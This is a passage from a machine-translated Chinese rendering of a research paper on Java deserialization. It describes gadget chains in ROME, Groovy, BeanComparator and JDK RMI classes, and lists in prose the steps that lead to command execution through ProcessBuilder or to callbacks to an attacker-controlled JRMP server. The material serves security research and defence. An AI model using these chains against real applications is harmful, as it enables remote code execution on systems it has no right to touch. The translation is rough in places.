<div style="position:absolute;top:31059;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">java.io.Serializable，有一个公共默认构造函数以及公共 getter/setter</font></font></nobr></div>
<div style="position:absolute;top:31075;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所需的“属性”属性的方法。</font><font style="vertical-align: inherit;">需要能够调用</font></font></nobr></div>
<div style="position:absolute;top:31093;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果排序集合/映射可以使用</font></font></nobr></div>
<div style="position:absolute;top:31111;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自定义 java.util.Comparator。</font></font></nobr></div>
<div style="position:absolute;top:31137;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用具有“属性”设置的 Comparator 构建集合/映射</font></font></nobr></div>
<div style="position:absolute;top:31155;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到要调用的 getter 方法。</font></font></nobr></div>
<div style="position:absolute;top:31177;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 插入目标对象的两个实例，从而调用 Comparator。</font></font></nobr></div>
<div style="position:absolute;top:31199;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. BeanComparator 将调用两个对象上的属性 getter 方法。</font></font></nobr></div>
<div style="position:absolute;top:31225;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用于触发</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#16"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TemplatesImpl（4.1.1）</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JdbcRowSet的（4.2）</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">经由</font></font></nobr></div>
<div style="position:absolute;top:31243;left:165"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'databaseMetaData' 属性。</font></font></nobr></div>
<div style="position:absolute;top:31477;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:31725;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="26"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 26 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:31885;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.18 罗马 EqualsBean/ToStringBean</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:31924;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:31959;left:173"><nobr><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java 序列化 (3.2.1) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#11"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Kryo (3.2.2)</font></font></a><font color="#000000" style="font-size:8px"><a href="https://translate.googleusercontent.com/translate_f#12"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">† </font></font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, </font></font></font><a href="https://translate.googleusercontent.com/translate_f#13"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hessian/Burlap (3.2.3) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#13"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> json-io (3.2.4)</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#14"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></font></nobr></div>
<div style="position:absolute;top:31977;left:173"><nobr><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XStream (3.2.5)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:32018;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为 Java 反序列化小工具发布。</font><font style="vertical-align: inherit;">两种相关类型都实现了 java.io。</font></font></nobr></div>
<div style="position:absolute;top:32037;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可序列化。</font><font style="vertical-align: inherit;">它们没有默认构造函数，也没有 setter。</font><font style="vertical-align: inherit;">所以</font></font></nobr></div>
<div style="position:absolute;top:32054;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用需要一个允许任意构造函数调用的编组器，或者</font></font></nobr></div>
<div style="position:absolute;top:32072;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根本不调用任何构造函数。</font><font style="vertical-align: inherit;">需要能够编组 java.lang.Class。</font></font></nobr></div>
<div style="position:absolute;top:32097;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 创建一个 EqualsBean，并将 'obj' 设置为 ToStringBean 实例。</font><font style="vertical-align: inherit;">ToStringBean 的</font></font></nobr></div>
<div style="position:absolute;top:32115;left:203"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'obj' 设置为目标对象，其 'beanClass' 属性设置为对象的类。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">59</font></font></font></nobr></div>
<div style="position:absolute;top:32138;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 将该结果对象插入到调用 hashCode() 的集合中。</font></font></nobr></div>
<div style="position:absolute;top:32160;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. EqualsBean-&gt;hashCode() 触发其 'obj' 属性的 toString() 方法。</font></font></nobr></div>
<div style="position:absolute;top:32183;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. ToStringBean-&gt;toString() 在它的'obj'上调用'beanClass'的所有getter方法。</font></font></nobr></div>
<div style="position:absolute;top:32208;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用于触发</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#16"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TemplatesImpl（4.1.1）</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JdbcRowSet的（4.2）</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">经由</font></font></nobr></div>
<div style="position:absolute;top:32226;left:165"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'databaseMetaData' 属性。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:32270;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.19 Groovy Expando/MethodClosure</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:32309;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:32344;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#12"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克里奥 (3.2.2)</font></font></a><font color="#000000" style="font-size:8px"><a href="https://translate.googleusercontent.com/translate_f#12"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">† </font></font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, </font></font></font><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">json-io (3.2.4)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:32385;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个已经被用于利用</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#15"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XStream（3.2.5）</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#15"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">60</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">两种类型都没有</font></font></nobr></div>
<div style="position:absolute;top:32403;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实现 java.io.Serializable。</font><font style="vertical-align: inherit;">攻击者的属性没有设置器</font></font></nobr></div>
<div style="position:absolute;top:32421;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要控制才能成功利用。</font><font style="vertical-align: inherit;">MethodClosure 没有默认值</font></font></nobr></div>
<div style="position:absolute;top:32439;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构造函数并有一个 readResolve() 和/或 readObject() 方法，该方法抛出一个</font></font></nobr></div>
<div style="position:absolute;top:32457;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">异常（不得调用）。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">61</font></font></font></nobr></div>
<div style="position:absolute;top:32482;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 创建一个 MethodClosure，将 'delegate' 和 'owner' 属性设置为</font></font></nobr></div>
<div style="position:absolute;top:32501;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用命令和参数设置的 java.lang.ProcessBuilder 实例，设置</font></font></nobr></div>
<div style="position:absolute;top:32518;left:203"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“方法”来“开始”。</font></font></nobr></div>
<div style="position:absolute;top:32540;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 创建一个 Expando 实例并将 MethodClosure 添加到 'expandoProper-</font></font></nobr></div>
<div style="position:absolute;top:32558;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'hashCode' 键的 ties' 映射。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">62</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:32591;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">59</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或包含应调用的 getter 方法的超类/接口，这可能会有所帮助</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:32608;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为来自 getter 的异常将停止执行</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:32620;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">60</font></font><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"></a><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www </font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对比安全</font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/security-influencers/serialization-must-die-act-2-</font></font></a></font></nobr></div>
</span></font>
<font size="2" color="#0000cc" face="Times"><span style="font-size:9px;font-family:Times;color:#0000cc">
<div style="position:absolute;top:32637;left:186"><nobr><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流</font></font></a><font color="#000000"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-2-xstream"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, 可能有事先使用</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:32648;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">61 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">readResolve() 在 2.4.4 版本中引入，从 2.4.8 版本开始还有一个 readObject()</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:32664;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实现将做同样的事情</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:32676;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">62</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也可以通过 'toString' 和 'equals' 触发</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:32739;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">26</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:32987;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="27"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 27 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:33150;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 插入到调用 hashCode() 的集合中。</font><font style="vertical-align: inherit;">Expando 调用 MethodClosure</font></font></nobr></div>
<div style="position:absolute;top:33167;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于调用 ProcessBuilder-&gt;start() 执行 com-</font></font></nobr></div>
<div style="position:absolute;top:33185;left:205"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">曼德。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:33228;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.20 sun.rmi.server.UnicastRef(2)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:33263;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:33297;left:174"><nobr><a href="https://translate.googleusercontent.com/translate_f#8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BlazeDS (3.1.4) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#8"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> json-io (3.2.4)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:33337;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 Oracle/OpenJDK 标准库。</font><font style="vertical-align: inherit;">已作为过滤器旁路发布</font></font></nobr></div>
<div style="position:absolute;top:33355;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于 Java 序列化的小工具。</font><font style="vertical-align: inherit;">需要支持 java.io.Externalizable。</font></font></nobr></div>
<div style="position:absolute;top:33377;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 java.io.Externalizable-&gt;readExternal() 这将注册一个对象引用-</font></font></nobr></div>
<div style="position:absolute;top:33394;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 LiveRef-&gt;read() 进行 RMI 分布式垃圾收集 (DGC)。</font><font style="vertical-align: inherit;">为了</font></font></nobr></div>
<div style="position:absolute;top:33412;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行 DGC 对象的用户必须通知托管该对象的端点</font></font></nobr></div>
<div style="position:absolute;top:33430;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于它的用法。</font><font style="vertical-align: inherit;">这是通过打开</font><font style="vertical-align: inherit;">到该端点</font><font style="vertical-align: inherit;">的 JRMP </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">63</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接来完成的</font></font></nobr></div>
<div style="position:absolute;top:33448;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并对 DGC 服务进行脏（）调用。</font><font style="vertical-align: inherit;">远程端点地址是</font></font></nobr></div>
<div style="position:absolute;top:33466;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者控制的，这意味着我们正在对攻击者控制的 JRMP 执行调用</font></font></nobr></div>
<div style="position:absolute;top:33484;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器。</font><font style="vertical-align: inherit;">JRMP 基于 Java 序列化，精心设计的异常返回值将</font></font></nobr></div>
<div style="position:absolute;top:33502;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由主机解组引用反序列化。</font><font style="vertical-align: inherit;">这让攻击者有</font></font></nobr></div>
<div style="position:absolute;top:33520;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有机会进一步利用它，通常不受过滤器的阻碍</font></font></nobr></div>
<div style="position:absolute;top:33538;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出现在其他地方。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">64</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:33581;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.21 java.rmi.server.UnicastRemoteObject</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:33618;left:173"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:33652;left:173"><nobr><a href="https://translate.googleusercontent.com/translate_f#9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杰克逊 (3.1.6) </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#14"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> json-io (3.2.4)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:33692;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 Oracle/OpenJDK 标准库。</font><font style="vertical-align: inherit;">已作为过滤器旁路发布</font></font></nobr></div>
<div style="position:absolute;top:33710;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于 Java 序列化的小工具。</font><font style="vertical-align: inherit;">成功的利用需要攻击者能够</font></font></nobr></div>
<div style="position:absolute;top:33728;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用受保护的默认构造函数、任意受保护的构造函数或 readObject()。</font></font></nobr></div>
<div style="position:absolute;top:33749;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将通过 RMI 导出读取/实例化的对象。</font><font style="vertical-align: inherit;">在这样做的过程中</font></font></nobr></div>
<div style="position:absolute;top:33767;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它将确保指定的端点存在，如果</font></font></nobr></div>
<div style="position:absolute;top:33785;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它没有，绑定到 0.0.0.0。</font><font style="vertical-align: inherit;">如果使用受保护的默认构造函数，那将</font></font></nobr></div>
<div style="position:absolute;top:33803;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绑定到一个随机端口，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">65</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">否则端口可以由攻击者提供。</font><font style="vertical-align: inherit;">如果说</font></font></nobr></div>
<div style="position:absolute;top:33821;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者可以访问侦听器，这可能还允许利用 Java</font></font></nobr></div>
<div style="position:absolute;top:33839;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 JRMP 进行反序列化。</font></font></nobr></div>
<div style="position:absolute;top:33861;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个有一些限制。</font><font style="vertical-align: inherit;">为了利用 JRMP 服务器，需要</font></font></nobr></div>
<div style="position:absolute;top:33879;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽可能地调用一个对象。</font><font style="vertical-align: inherit;">我们需要的对象 ID 就足够了</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:33903;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">63 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JRMP是RMI中常用的远程过程调用协议</font></font></font></nobr></div>
<div style="position:absolute;top:33918;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">64</font></font><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/kantega/notsoserial"></a><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/kantega/notsoserial"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://github </font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/kantega/notsoserial"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/kantega/notsoserial"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/kantega/notsoserial</font></font></a></font><font style="vertical-align: inherit;"><font style="font-size:9px"><font style="vertical-align: inherit;">是一个基于代理的</font></font><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/kantega/notsoserial"><font style="vertical-align: inherit;">前瞻</font></a></font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过滤器，它仍然适用，</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:33934;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即将推出的标准库机制也可能如此，但用户空间过滤器实现</font></font></nobr></div>
<div style="position:absolute;top:33948;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">惯于</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:33960;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">65</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">认为用蛮力导出当然是可能的，也可以通过以下方式提高效率</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:33976;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开多个</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:34001;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">27</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:34249;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="28"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 28 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:34412;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随机。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">66</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存在三个众所周知的对象 ID – DGC (2)、RMI Activator (1)</font></font></nobr></div>
<div style="position:absolute;top:34429;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 RMI 注册表 (0)。</font><font style="vertical-align: inherit;">唯一始终可用的是 DGC，</font></font></nobr></div>
<div style="position:absolute;top:34447;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RMI Registry 可能 如果应用程序使用 RMI/JMX，Activator 可能很少见。</font></font></nobr></div>
<div style="position:absolute;top:34465;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据目标应用程序的类加载器架构，可能无法</font></font></nobr></div>
<div style="position:absolute;top:34483;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接利用这一点，因为众所周知的对象使用 AppClassLoader 并且可能</font></font></nobr></div>
<div style="position:absolute;top:34501;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不够。</font></font></nobr></div>
<div style="position:absolute;top:34524;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，导出的对象将使用线程的上下文类加载器，它是</font></font></nobr></div>
<div style="position:absolute;top:34542;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在创建对象时处于活动状态。</font><font style="vertical-align: inherit;">在 Web 应用程序的情况下，这通常是</font></font></nobr></div>
<div style="position:absolute;top:34559;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有趣的一个。</font><font style="vertical-align: inherit;">如果攻击者能够泄漏该对象的标识符，则访问该对象</font></font></nobr></div>
<div style="position:absolute;top:34577;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">object 及其类加载器是可能的，可以进一步利用。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">67</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
